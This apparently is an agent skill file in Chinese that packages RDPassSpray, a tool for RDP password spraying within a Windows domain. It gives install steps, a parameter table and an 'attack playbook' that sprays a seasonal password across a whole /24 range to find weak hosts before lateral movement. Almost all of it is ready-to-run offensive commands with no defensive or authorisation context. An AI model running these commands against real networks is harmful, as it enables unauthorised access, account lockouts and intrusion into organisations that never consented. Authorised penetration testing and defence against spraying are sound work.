---
name: rdpassspray-rdp-spray
description: RDPassSpray: 域内 RDP 口令喷洒。信号:暴力破解,口令喷射,RDP 喷洒,密码字典,指定域。
---

# RDPassSpray

- 攻击大类:C28 云与身份喷洒
- 上游仓库:https://github.com/xFreed0m/RDPassSpray
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/xFreed0m/RDPassSpray && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python RDPassSpray.py -u users.txt -p 'Pass1' -t 10.0.0.5` | RDP 喷洒 |
| `-u user -p passwords.txt` | 密码字典 |
| `-d corp.local` | 指定域 |
| `-v` | 详细 |

## 攻击场景 Playbook

### 域内 RDP 口令喷洒

```bash
python RDPassSpray.py -u users.txt -p 'Summer2024!' -t 10.0.0.0/24
# 横向移动前先找弱口令主机
```

## 注意事项

RDP 协议级密码喷洒,目标可为 IP 段,域/工作组皆适用。
